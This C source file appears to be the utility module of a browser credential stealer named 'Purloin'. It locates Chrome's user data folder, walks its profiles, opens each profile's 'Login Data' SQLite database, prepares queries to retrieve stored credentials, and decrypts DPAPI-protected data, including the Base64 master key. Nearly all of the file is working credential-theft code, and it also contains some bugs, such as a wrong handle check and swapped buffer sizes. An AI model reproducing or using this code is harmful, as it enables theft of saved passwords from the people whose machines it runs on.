#include "includes/Purloin_Utils.h"
#include "includes/Purloin_Debug.h"

// Converts CHAR in Base64 to Bytes.  User must free the byte data after usage.
BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_string) {
	/* To Convert CHAR form of Base64 encoded master key to Byte form, the resulting buffer size is needed, so 'size_byte_master_key' is passed to get that value */
	if (!(CryptStringToBinaryA(base64_string, 0, CRYPT_STRING_BASE64, NULL, size_byte_string, NULL, NULL))) {
		return FALSE;
	}
	/* Using above 'size_byte_master_key', a buffer is created to hold Byte form of Base64 encoded master key */
	*byte_string = (BYTE*)malloc(*size_byte_string);
	if (!*byte_string) {
		return FALSE;
	}
	/* Convert Base64 encoded master key into byte form */
	if (!(CryptStringToBinaryA(base64_string, 0, CRYPT_STRING_BASE64, *byte_string, size_byte_string, NULL, NULL))) {
		return FALSE;
	}
	return TRUE;
}

// Decrypts data that is encrypted using DPAPI API.
BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* decrypted_data) {
	DATA_BLOB blob_enc_masterkey;
	blob_enc_masterkey.cbData = size_encrypted_data;
	blob_enc_masterkey.pbData = encrypted_data;
	if (!(CryptUnprotectData(&blob_enc_masterkey, NULL, NULL, NULL, NULL, 0, decrypted_data))) {
		return FALSE;
	}
	return TRUE;
}

// Gets the browser directory specified by the FOLDER_ID (look at win32 docs) and the relative path from that FOLDER_ID
DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize) {
	PWSTR p_temp_userdata_location = NULL;															// Temporary pointer to hold returned user data (%LOCALAPPDATA%, %APPDATA%, etc.) folder path
	HRESULT hr;																						// Error handling 
	errno_t err;																					// Error handling 

	/* Get Local Appdata Directory of the user */
	if (FAILED(hr = SHGetKnownFolderPath(folder_id, 0, NULL, &p_temp_userdata_location))) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: SHGetKnownFolderPath: Getting Local Appdata Directory error code: %ld\n", hr);)
		CoTaskMemFree(p_temp_userdata_location);
		return FALSE;
	}

	/* Copy %LOCALAPPDATA% location to permenant buffer */
	if ((err = wmemcpy_s(buf_path, MAX_PATH, p_temp_userdata_location, lstrlenW(p_temp_userdata_location))) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: wmemcpy_s: Copying %%LOCALAPPDATA%% to buffer error code: %d\n", err);)
		return FALSE;
	}

	/* Copy relative path of Chrome directory from %LOCALAPPDATA% to permenant buffer */
	if ((err = wmemcpy_s(buf_path + lstrlenW(p_temp_userdata_location), MAX_PATH, browser_location, lstrlenW(browser_location)+1)) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: wmemcpy_s: Copying Chrome Userdata folder to buffer error code: %d\n", err);)
		return FALSE;
	}

	/* Check if that Chrome path exitsts */
	if (!PathFileExistsW(buf_path)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: PathFileExistsW: No folder found.\n");)
		return FALSE;
	}

	/* Free the memory allocated by temporary buffer to hold the %LOCALAPPDATA% folder */
	CoTaskMemFree(p_temp_userdata_location);
	return TRUE;
}

// Check if specified 'test_string' is in 'substring'
BOOL checkSubtring(const CHAR* substring, PCHAR test_string) {
	if (lstrlenA(substring) <= lstrlenA(test_string)) {
		for (int i = 0; i < lstrlenA(substring); i++) {
			if (substring[i] != test_string[i]) return FALSE;
		}
		return TRUE;
	}
	return FALSE;
}

// Gets file/directory exploration handle and a struct that contains info about the found files/sub-directories of the specified directory. Which then can be used to call FileNextA() to iterate over found files/sub-dirs. 
BOOL get_file_explorer(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, WORD buf_outSize) {
	errno_t err;

	/* Append '\*' to the chrome_dir to get the file handle for the '%LOCALAPPDATA%\Google\Chrome\User Data\*' folder */
	if ((err = strcat_s(chrome_dir, MAX_PATH, "\\*")) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '\\\\*' to chrome_dir error: %d\n", err);)
		return FALSE;
	}

	/* Gets the first file/folder handle in the directory, and set it to 'dir_handle' */
	*dir_handle = FindFirstFileA(chrome_dir, dir_files);
	if (dir_handle == INVALID_HANDLE_VALUE) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "Getting sub directories error: %lu\n", GetLastError());)
		return FALSE;
	}

	/* Clears the ending '\*' part in the chrome_dir */
	memset(chrome_dir + lstrlenA(chrome_dir) - 2, '\0', 2);

	return TRUE;
}

// Open database connection
BOOL open_database(PSTR chrome_dir_char, PSTR profile_name, void** handle_db, PSTR buf_outMsg, WORD buf_outSize) {
	errno_t err;
	int status;

	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\")) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '\\\\' to chrome_dir_char error: %d\n", err);)
		return FALSE;
	}
	if ((err = strcat_s(chrome_dir_char, MAX_PATH, profile_name)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '%s' to chrome_dir_char error: %d\n", profile_name, err);)
		return FALSE;
	}
	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\Login Data")) != 0) {									// Append '\Login Data' to end of chrome_dir_char
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending 'Login Data' to chrome_dir_char error: %d\n", err);)
		return FALSE;
	}

	if ((status = sqlite3_open_v2(chrome_dir_char, (sqlite3**)handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open_v2: Error when opening database connection to '%s', error: %s:%d\n", profile_name, sqlite3_errmsg(*(sqlite3**)handle_db), status);)
		return FALSE;
	}

	return TRUE;
}

// Prepare and get the sql handle for sql statement in order to retrieve credentials
BOOL prepare_sql(void* handle_db, void** handle_sql_stmt, const char * sql_stmt, PSTR buf_outMsg, WORD buf_outSize) {
	int status;
	if ((status = sqlite3_prepare_v2((sqlite3*)handle_db, sql_stmt, -1, (sqlite3_stmt**)handle_sql_stmt, 0)) != SQLITE_OK) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_prepare_v2: Error when preaparing statement, error: %s:%d\n", sqlite3_errmsg((sqlite3*)handle_db), status);)
		return FALSE;
	}
	return TRUE;
}

BOOL sql_result(sqlite3_stmt* handle_sql_stmt, char * result_1, int result_1_size, char * result_2, int result_2_size, char * result_3, int result_3_size) {
	int status;
	if ((status = sqlite3_step(handle_sql_stmt)) == SQLITE_ROW) {
		memcpy(result_1, sqlite3_column_text(handle_sql_stmt, 0), result_1_size);
		memcpy(result_2, sqlite3_column_text(handle_sql_stmt, 1), result_3_size);
		memcpy(result_3, sqlite3_column_text(handle_sql_stmt, 2), result_2_size);
		return TRUE;
	}
	else {
		return FALSE;
	}
}